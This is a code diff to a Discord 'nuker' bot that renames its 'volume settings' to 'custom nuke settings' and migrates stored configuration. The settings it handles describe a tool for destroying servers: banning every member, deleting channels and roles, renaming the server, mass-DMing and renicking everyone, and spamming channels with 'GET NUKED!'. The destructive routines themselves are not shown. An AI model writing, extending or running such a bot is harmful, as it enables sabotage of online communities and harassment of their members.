@@ -58,7 +58,7 @@ if "settings.json" not in listdir():
     #VERSIONMESSAGE
     VERSIONMESSAGE = True
 
-    towrite = dumps({"TOKEN": TOKEN, "USERID": USER_ID, "PREFIX": PREFIX, "STATUS": STATUS, "LOG": LOG, "LOGFILE": LOGFILE, "SHOWCONNECTEDSERVERS": SHOWCONNECTEDSERVERS, "VERSIONMESSAGE": VERSIONMESSAGE, "NUCLEARBUNKERS": NUCLEARBUNKERS, "ROLE_IDS": {}, "VOLUMESETTINGS": {}})
+    towrite = dumps({"TOKEN": TOKEN, "USERID": USER_ID, "PREFIX": PREFIX, "STATUS": STATUS, "LOG": LOG, "LOGFILE": LOGFILE, "SHOWCONNECTEDSERVERS": SHOWCONNECTEDSERVERS, "VERSIONMESSAGE": VERSIONMESSAGE, "NUCLEARBUNKERS": NUCLEARBUNKERS, "ROLE_IDS": {}, "CUSTOMNUKESETTINGS": {}})
 
     # Writes settings to file
     file = open("settings.json", "w+")
@@ -74,8 +74,14 @@ else:
     file.close()
     settings = loads(json_string)
 
+    if "VOLUMESETTINGS" in settings.keys():
+        settings["CUSTOMNUKESETTINGS"] = settings.pop("VOLUMESETTINGS")
+        file = open("settings.json", "w+")
+        file.write(dumps(settings))
+        file.close()
+
     # If settings are missing, add them
-    defaultsettingsjson = {"TOKEN": "", "USERID": False, "PREFIX": "!", "STATUS": False, "LOG": True, "LOGFILE": "nuker_bot_log.txt", "VERSIONMESSAGE": True, "NUCLEARBUNKERS": [],"SHOWCONNECTEDSERVERS": True, "ROLE_IDS": {}, "VOLUMESETTINGS": {}}
+    defaultsettingsjson = {"TOKEN": "", "USERID": False, "PREFIX": "!", "STATUS": False, "LOG": True, "LOGFILE": "nuker_bot_log.txt", "VERSIONMESSAGE": True, "NUCLEARBUNKERS": [],"SHOWCONNECTEDSERVERS": True, "ROLE_IDS": {}, "CUSTOMNUKESETTINGS": {}}
     keysnotpresent = [i for i in defaultsettingsjson.keys() if i not in settings.keys()]
     if len(keysnotpresent) > 0:
         for key in keysnotpresent: settings[key] = defaultsettingsjson[key]
@@ -146,18 +152,18 @@ def writeRoleIDs(write):
     file.close()
 
 
-# Read and write volume settings
-def getVolumeSettings():
+# Read and write custom nuke settings
+def getCustomNukeSettings():
     file = open("settings.json", "r")
     read = file.read()
     file.close()
-    return loads(read)["VOLUMESETTINGS"]
+    return loads(read)["CUSTOMNUKESETTINGS"]
 
 
-def writeVolumeSettings(write):
+def writeCustomNukeSettings(write):
     file = open("settings.json", "r")
     read = loads(file.read())
-    read["VOLUMESETTINGS"] = write
+    read["CUSTOMNUKESETTINGS"] = write
     file.close()
 
     file = open("settings.json", "w+")
@@ -181,7 +187,7 @@ async def settingsembed(user, message):
     embed.set_author(name=user.name, icon_url=f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png")
     return embed
 
-default_volume_settings = {
+default_custom_nuke_settings = {
     "ban": True,
     "channels": True,
     "roles": True,
@@ -195,7 +201,7 @@ default_volume_settings = {
 
 config_options = {}
 i = 1
-for key in default_volume_settings.keys():
+for key in default_custom_nuke_settings.keys():
     config_options[i] = key
     i += 1
 
@@ -568,36 +574,36 @@ Server Owner: {ctx.guild.owner}
 
 @bot.command(name="resetsettings", aliases=commandaliases["resetsettings"])
 async def resetsettings(ctx):
-    volume_settings=getVolumeSettings()
-    volume_settings[f"{ctx.message.author.id}"] = default_volume_settings
-    writeVolumeSettings(volume_settings)
+    custom_nuke_settings=getCustomNukeSettings()
+    custom_nuke_settings[f"{ctx.message.author.id}"] = default_custom_nuke_settings
+    writeCustomNukeSettings(custom_nuke_settings)
     await ctx.send(embed=await settingsembed(ctx.message.author, "Reset settings."))
 
 
 @bot.command(name="showsettings", aliases=commandaliases["showsettings"])
 async def showsettings(ctx):
-    volume_settings = getVolumeSettings()
-    if f"{ctx.message.author.id}" not in volume_settings.keys():  # write default settings if entry doesn't exist
-        volume_settings[f"{ctx.message.author.id}"] = default_volume_settings
-        writeVolumeSettings(volume_settings)
+    custom_nuke_settings = getCustomNukeSettings()
+    if f"{ctx.message.author.id}" not in custom_nuke_settings.keys():  # write default settings if entry doesn't exist
+        custom_nuke_settings[f"{ctx.message.author.id}"] = default_custom_nuke_settings
+        writeCustomNukeSettings(custom_nuke_settings)
 
-    user_volume_settings = getVolumeSettings()[str(ctx.message.author.id)]
+    user_custom_nuke_settings = getCustomNukeSettings()[str(ctx.message.author.id)]
 
     embed=discord.Embed(title="Settings", description=f'''
-Ban Everyone: {user_volume_settings["ban"]}
-Delete Channels: {user_volume_settings["channels"]}
-Delete Roles: {user_volume_settings["roles"]}
-Edit Server: {user_volume_settings["server"][0]}
-Server Name: "{user_volume_settings["server"][1]}"
-Server Icon: {user_volume_settings["server"][2]}
-Create Nuke Channel: {user_volume_settings["nuke_channel"][0]}
-Nuke Channel Name: "{user_volume_settings["nuke_channel"][1]}"
-DM everyone: {user_volume_settings["dm"][0]}
-DM message: "{user_volume_settings["dm"][1]}"
-Nick Everyone: {user_volume_settings["nick"][0]}
-Nick Name: "{user_volume_settings["nick"][1]}"
-Create max channels: {user_volume_settings["maxchannels"]}
-Nuke Channel Message: {user_volume_settings["nc_msg"][0]}
+Ban Everyone: {user_custom_nuke_settings["ban"]}
+Delete Channels: {user_custom_nuke_settings["channels"]}
+Delete Roles: {user_custom_nuke_settings["roles"]}
+Edit Server: {user_custom_nuke_settings["server"][0]}
+Server Name: "{user_custom_nuke_settings["server"][1]}"
+Server Icon: {user_custom_nuke_settings["server"][2]}
+Create Nuke Channel: {user_custom_nuke_settings["nuke_channel"][0]}
+Nuke Channel Name: "{user_custom_nuke_settings["nuke_channel"][1]}"
+DM everyone: {user_custom_nuke_settings["dm"][0]}
+DM message: "{user_custom_nuke_settings["dm"][1]}"
+Nick Everyone: {user_custom_nuke_settings["nick"][0]}
+Nick Name: "{user_custom_nuke_settings["nick"][1]}"
+Create max channels: {user_custom_nuke_settings["maxchannels"]}
+Nuke Channel Message: {user_custom_nuke_settings["nc_msg"][0]}
 '''.removeprefix("\n"))
     embed.set_author(name=ctx.message.author.name, icon_url=f"https://cdn.discordapp.com/avatars/{ctx.message.author.id}/{ctx.message.author.avatar}.png")
     await ctx.send(embed=embed)
@@ -606,13 +612,13 @@ Nuke Channel Message: {user_volume_settings["nc_msg"][0]}
 @bot.command(name="settings", aliases=commandaliases["settings"])
 async def settings(ctx, value: str, status: bool, arg1: Optional[str], arg2: Optional[str]):
 
-    volume_settings = getVolumeSettings()
+    custom_nuke_settings = getCustomNukeSettings()
     
-    if f"{ctx.message.author.id}" not in volume_settings.keys():  # write default settings if entry doesn't exist
-        volume_settings[f"{ctx.message.author.id}"] = default_volume_settings
-        writeVolumeSettings(volume_settings)
+    if f"{ctx.message.author.id}" not in custom_nuke_settings.keys():  # write default settings if entry doesn't exist
+        custom_nuke_settings[f"{ctx.message.author.id}"] = default_custom_nuke_settings
+        writeCustomNukeSettings(custom_nuke_settings)
 
-    settings = volume_settings[f"{ctx.message.author.id}"]
+    settings = custom_nuke_settings[f"{ctx.message.author.id}"]
 
     if value != "*":
         setting = config_options[int(value)]
@@ -706,7 +712,7 @@ async def settings(ctx, value: str, status: bool, arg1: Optional[str], arg2: Opt
         lines.append(f"Changed \"nuke channel message\" to {status} with a message of \"GET NUKED!\"")
 
         # save config options
-        volume_settings[f"{ctx.message.author.id}"] = {
+        custom_nuke_settings[f"{ctx.message.author.id}"] = {
             "ban": config_1,
             "channels": config_2,
             "roles": config_3,
@@ -718,7 +724,7 @@ async def settings(ctx, value: str, status: bool, arg1: Optional[str], arg2: Opt
             "nc_msg": config_9
         }
         await ctx.send(embed=await settingsembed(ctx.message.author, "\n".join(lines)))
-    writeVolumeSettings(volume_settings)
+    writeCustomNukeSettings(custom_nuke_settings)
 
 
 @bot.command(name="customnuke", aliases=commandaliases["customnuke"])
@@ -728,13 +734,13 @@ async def customnuke(ctx):
         if ctx.message.author.id != USER_ID:
             return
 
-    volume_settings = getVolumeSettings()
+    custom_nuke_settings = getCustomNukeSettings()
 
-    if f"{ctx.message.author.id}" not in volume_settings.keys():
-        volume_settings[f"{ctx.guild.id}"] = default_volume_settings
-        writeVolumeSettings(volume_settings)
+    if f"{ctx.message.author.id}" not in custom_nuke_settings.keys():
+        custom_nuke_settings[f"{ctx.guild.id}"] = default_custom_nuke_settings
+        writeCustomNukeSettings(custom_nuke_settings)
 
-    settings = volume_settings[f"{ctx.message.author.id}"]
+    settings = custom_nuke_settings[f"{ctx.message.author.id}"]
 
     do_ban = settings["ban"]
     do_channels = settings["channels"]
